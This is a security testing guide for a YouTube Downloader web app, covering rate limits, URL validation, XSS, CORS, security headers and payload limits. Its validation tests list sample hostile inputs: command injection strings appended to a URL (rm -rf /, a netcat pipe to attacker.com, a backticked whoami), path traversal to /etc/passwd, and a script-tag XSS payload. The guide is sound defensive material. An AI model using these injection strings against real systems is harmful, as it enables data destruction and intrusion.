# Security Testing Guide

This guide helps you verify the security features of the YouTube Downloader application.

## 🧪 Testing Security Features

### 1. Test Rate Limiting

**How to test:**
1. Make multiple requests rapidly (more than 100 in 15 minutes)
2. Observe rate limit responses

**Expected Result:**
```json
{
  "error": "Too many requests from this IP, please try again later.",
  "retryAfter": 900
}
```

---

### 2. Test Input Validation

**Try these invalid inputs:**

❌ **Non-YouTube URLs:**
```
https://example.com/video
https://vimeo.com/123456
ftp://youtube.com/watch
```

Expected: `Invalid YouTube URL` error

❌ **Command Injection Attempts:**
```
https://youtube.com/watch?v=abc; rm -rf /
https://youtube.com/watch?v=abc | nc attacker.com 1234
https://youtube.com/watch?v=abc`whoami`
```

Expected: `Invalid URL format detected` error

❌ **Path Traversal Attempts:**
```
https://youtube.com/watch?v=../../etc/passwd
https://youtube.com/watch?v=..\\..\\windows\\system32
```

Expected: `Invalid URL format detected` error

---

### 3. Test Download Rate Limiting

**How to test:**
1. Attempt to download 6 videos within 1 minute
2. Observe rate limit on downloads

**Expected Result:**
```json
{
  "error": "Too many download requests. Please wait before downloading again.",
  "retryAfter": 60
}
```

---

### 4. Test XSS Prevention

**Frontend XSS Test:**

Try injecting HTML in browser console:
```javascript
// This should NOT execute
fetch('/api/download', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    url: '<script>alert("XSS")</script>',
    format: 'video'
  })
});
```

**Expected Result:** 
- Script NOT executed
- URL validation fails
- Error message returned

---

### 5. Test CORS Protection

**How to test (from different origin):**

```javascript
// From attacker.com trying to access localhost:3000
fetch('http://localhost:3000/api/downloads', {
  method: 'GET',
  credentials: 'include'
});
```

**Expected Result:**
- CORS error in browser console
- Request blocked

---

### 6. Test Security Headers

**Using curl:**
```bash
curl -i http://localhost:3000/
```

**Expected Response Headers:**
```
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
```

**Using online tool:**
Visit https://securityheaders.com and test your server

---

### 7. Test Payload Size Limits

**How to test:**

```javascript
// Try to send payload larger than 10MB
const largePayload = 'a'.repeat(11 * 1024 * 1024);

fetch('/api/download', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    url: 'https://youtube.com/watch?v=' + largePayload,
    format: 'video'
  })
});
```

**Expected Result:**
- Request rejected
- 413 Payload Too Large error

---

### 8. Test Process Timeout

**How to test:**

The application has a 60-second timeout for downloads. If a download takes longer, it will be terminated.

**Expected Result:**
```json
{
  "error": "Download timeout: The video took too long to download. Please try again."
}
```

---

### 9. Test Error Message Information Disclosure

**How to test:**

Trigger an error and check the response.

**Expected in Development:**
```json
{
  "error": "Detailed error message",
  "timestamp": "2025-12-13T16:00:00.000Z"
}
```

**Expected in Production:**
```json
{
  "error": "An error occurred processing your request",
  "timestamp": "2025-12-13T16:00:00.000Z"
}
```

---

## 🔍 Security Testing Tools

### 1. **OWASP ZAP (Zed Attack Proxy)**

Free security scanning tool:
```bash
# Install from: https://www.zaproxy.org/
# Scan your local instance
zaproxy scan http://localhost:3000
```

### 2. **Burp Suite Community**

Web security testing:
- Download: https://portswigger.net/burp/communitydownload
- Intercept and analyze requests
- Test for common vulnerabilities

### 3. **curl with Security Headers**

```bash
# Check headers
curl -i -H "User-Agent: Mozilla/5.0" http://localhost:3000/

# Check CSP
curl -s http://localhost:3000/ | grep Content-Security-Policy

# Check HSTS
curl -i http://localhost:3000/ | grep Strict-Transport-Security
```

### 4. **npm audit**

Check for vulnerable dependencies:
```bash
npm audit
npm audit fix
```

---

## 📋 Security Test Checklist

- [ ] Rate limiting works (100 req/15min global)
- [ ] Download rate limiting works (5 downloads/min)
- [ ] YouTube URL validation works
- [ ] Command injection prevention works
- [ ] Path traversal prevention works
- [ ] XSS prevention works
- [ ] CORS properly configured
- [ ] Security headers present
- [ ] Payload size limits enforced
- [ ] Process timeouts working
- [ ] Error messages don't leak info
- [ ] HTTPS/TLS working (production)
- [ ] Dependencies have no vulnerabilities
- [ ] Logging captures security events

---

## 🚨 Incident Response

If you detect a security issue:

1. **Do not** publicly disclose
2. **Document** the vulnerability
3. **Report privately** to the development team
4. **Wait** for patch before disclosure
5. **Test** the patch in staging
6. **Deploy** to production

---

## 📊 Security Metrics

Track these metrics:

```
Total Requests: _____
Rate Limited: _____
Blocked (Invalid URL): _____
Blocked (Command Injection): _____
Successful Downloads: _____
Failed Downloads: _____
Average Response Time: _____ ms
Uptime: _____%
```

---

## 🔐 Compliance Checklist

- [ ] OWASP Top 10 compliance
- [ ] CWE/SANS Top 25 vulnerability prevention
- [ ] GDPR compliance (if applicable)
- [ ] Regular security audits
- [ ] Dependency scanning
- [ ] Static code analysis
- [ ] Dynamic security testing
- [ ] Penetration testing (annual)

---

## 🔗 Resources

- **OWASP:** https://owasp.org/
- **Security Headers:** https://securityheaders.com/
- **Mozilla Security Guide:** https://infosec.mozilla.org/guidelines
- **npm Security:** https://docs.npmjs.com/cli/v8/commands/npm-audit
- **NIST Cybersecurity:** https://www.nist.gov/programs/cybersecurity

---

## 📝 Test Report Template

```markdown
# Security Test Report
Date: [DATE]
Tester: [NAME]
Version: 1.0

## Tests Passed
- [ ] Test 1: [Result]
- [ ] Test 2: [Result]

## Issues Found
- [ ] Issue 1: [Description]
- [ ] Issue 2: [Description]

## Recommendations
1. [Recommendation 1]
2. [Recommendation 2]

## Approved By
[Signature/Approval]
```

---

**Last Updated:** December 13, 2025
